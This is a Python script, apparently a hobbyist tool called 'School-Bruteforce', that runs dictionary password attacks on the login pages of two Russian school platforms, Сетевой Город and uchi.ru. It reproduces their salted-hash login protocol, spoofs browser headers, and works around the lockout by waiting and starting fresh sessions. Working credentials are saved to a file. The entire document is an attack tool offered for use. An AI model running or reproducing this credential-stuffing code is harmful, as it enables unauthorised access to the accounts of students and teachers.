#!/bin/python
import requests, os, time, sys, json, re
import urllib.parse
from hashlib import md5

title = " School-Bruteforce v2.0.2-1"


def ng_getauthdata(config):
    session = requests.Session()
    response = session.post("https://" + config["url"] + "/webapi/auth/getdata")
    if response.status_code==200:
        for c in response.cookies:
            if c.name=="NSSESSIONID":
                NSSESSIONID = c.value
        return [session, response.json().pop('salt'), response.json().pop('lt'), response.json().pop('ver'), NSSESSIONID]

def ng_trytologin(session, username, password, config, NSSESSIONID, salt, lt, ver):
    login_headers = {
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
            "Accept":"application/json, text/javascript, */*; q=0.01",
            "Accept-Language":"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding":"gzip, deflate,br",
            "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With":"XMLHttpRequest",
            "Origin":"https://" + config["url"],
            "Connection":"keep-alive",
            "Referer":"https://" + config["url"] + "/",
            "Cookie":"NSSESSIONID=" + NSSESSIONID,
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            "Sec-Fetch-Site":"same-origin",
            "TE":"trailers",
    }
    encoded_password = md5(password.encode('windows-1251')).hexdigest().encode()
    pw2 = md5(salt.encode() + encoded_password).hexdigest()
    pw = pw2[:len(password)]
    raw_data = "LoginType=1&cid="+config["cid"]+"&sid="+config["sid"]+"&pid="+config["pid"]+"&cn="+config["cn"]+"&sft="+config["sft"]+"&scid="+config["scid"]+"&UN="+username+"&PW="+pw+"&lt="+lt+"&pw2="+pw2+"&ver="+ver
    response = session.post("https://" + config["url"] + "/webapi/login", data=raw_data.encode(), headers=login_headers)
    if "Неправильный" in str(response.json()):
        print("Wrong: " + password)
        return False
    else:
        return str(response.json())

def ng_trytologout(config, session):
    logout_headers = {
        "Host":config["url"],
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        "Accept-Language":"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding":"gzip, defalte, br",
        "DNT":"1",
        "Cookie": str(session.cookies.get_dict()).replace("{", "").replace("}", "").replace("': '", "=").replace(",", ";").replace("'", ""),
        "Upgrade-Insecure-Requests":"1",
        "Sec-Fetch-Dest":"document",
        "Sec-Fetch-Mode":"navigate",
        "Sec-Fetch-Site":"none",
        "Sec-Fetch-User":"?1"
    }
    session.post("https://" + config["url"] + "/asp/logout.asp", headers=logout_headers)
    session.close()

def ur_trytologin(session, login, password):
    global logfile
    raw_page = session.get("https://uchi.ru").text.split("<")
    login_headers = {
        'Host': 'uchi.ru',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding':'gzip, deflate, br',
        'Content-Type':'application/x-www-form-urlencoded',
        'Origin':'https://uchi.ru',
        'Connection':'keep-alive',
        'Referer':'https://uchi.ru/',
        'Cookie': str(session.cookies.get_dict()).replace("{", "").replace("}", "").replace("': '", "=").replace(",", ";").replace("'", ""),
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode':'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
    }
    for line in raw_page:
        if 'name="authenticity_token"' in line:
            token = re.findall(r"name=\"authenticity_token\" value=\"[^\"]*\"", line)[0].split('name="authenticity_token" value="')[1].split('"')[0]
    raw_data = "utf8=✓&authenticity_token="+urllib.parse.quote(token)+"&next=%2Fhome&login="+urllib.parse.quote(login)+"&password="+urllib.parse.quote(password)
    response = session.post("https://uchi.ru", data=raw_data.encode(), headers=login_headers)
    if "Expires" in str(response.headers):
        ur_trytologout(session)
        login_succ(username, password, logfile)
    else:
        print("Wrong: " + password)

def ur_trytologout(session):
    logout_headers = {
        'Host':'uchi.ru',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding':'gzip, deflate, br',
        'Connection':'keep-alive',
        'Cookie':str(session.cookies.get_dict()).replace("{", "").replace("}", "").replace("': '", "=").replace(",", ";").replace("'", ""),
        'Referer':'https://uchi.ru/profile/students',
        'Upgrade-Insecure-Requests':'1',
        'Sec-Fetch-Dest':'document',
        'Sec-Fetch-Mode':'navigate',
        'Sec-Fetch-User':'?1',
        'TE':'trailers',
    }
    response = session.get('https://uchi.ru/logout', headers=logout_headers)
    return response


def login_succ(username, password, logfile): 
    print("Success: " + password)
    open(logfile, "a").write("\n" + username + ":" + password)


def clear():
    if os.name=='nt':
        os.system('cls')
    else:
        os.system("clear")

print(title)
print()
print(" Mode: ")
print("1) Сетевой Город")
print("2) Учи.ру")
mode = input("Mode: ")
if mode!="1" and mode!="2": sys.exit(0)
usernames = input("Usernames file: ")
passwords = input("Dictionary file: ")
logfile = input("Results file: ")
if logfile=="": logfile = "results.txt"

try:
    passwords = [value for value in open(passwords, "r").read().split("\n") if value]
    usernames = [value for value in open(usernames, "r", encoding="UTF-8").read().split("\n") if value]
except FileNotFoundError:
    sys.exit()

if mode=="1": # Сетевой город
    print(" Make your own config from <url>/webapi/login response data")
    config = json.loads(open(input("Config file: ")).read())
    authdata = ng_getauthdata(config)
    for username in usernames:
        clear()
        print(title)
        print()
        print("Username: " + username)
        for password in passwords:
            login_response = ng_trytologin(authdata[0], username, password, config, authdata[4], authdata[1], authdata[2], authdata[3])
            if login_response==False: continue
            if "Вы совершили 3 неудачные попытки входа. Следующая попытка может быть совершена не ранее чем через минуту" in login_response:
                print("Requests limit. 1 minute sleep...")
                time.sleep(61)
                authdata = ng_getauthdata(config)
                login_response = ng_trytologin(authdata[0], username, password, config, authdata[4], authdata[1], authdata[2], authdata[3])
                if login_response==False: continue
            if "Ошибка входа в систему.\nПожалуйста, обновите в браузере страницу входа в систему" in login_response:
                authdata = ng_getauthdata(config) # make new session
                login_response = ng_trytologin(authdata[0], username, password, config, authdata[4], authdata[1], authdata[2], authdata[3])
                if login_response==False: continue
            ng_trytologout(config, authdata[0])
            login_succ(username, password, logfile)
elif mode=="2": # Учи.ру
    session = requests.Session()
    for username in usernames:
        clear()
        print(title)
        print()
        print("Username: " + username)
        for password in passwords:
            login_answer = ur_trytologin(session, username, password)
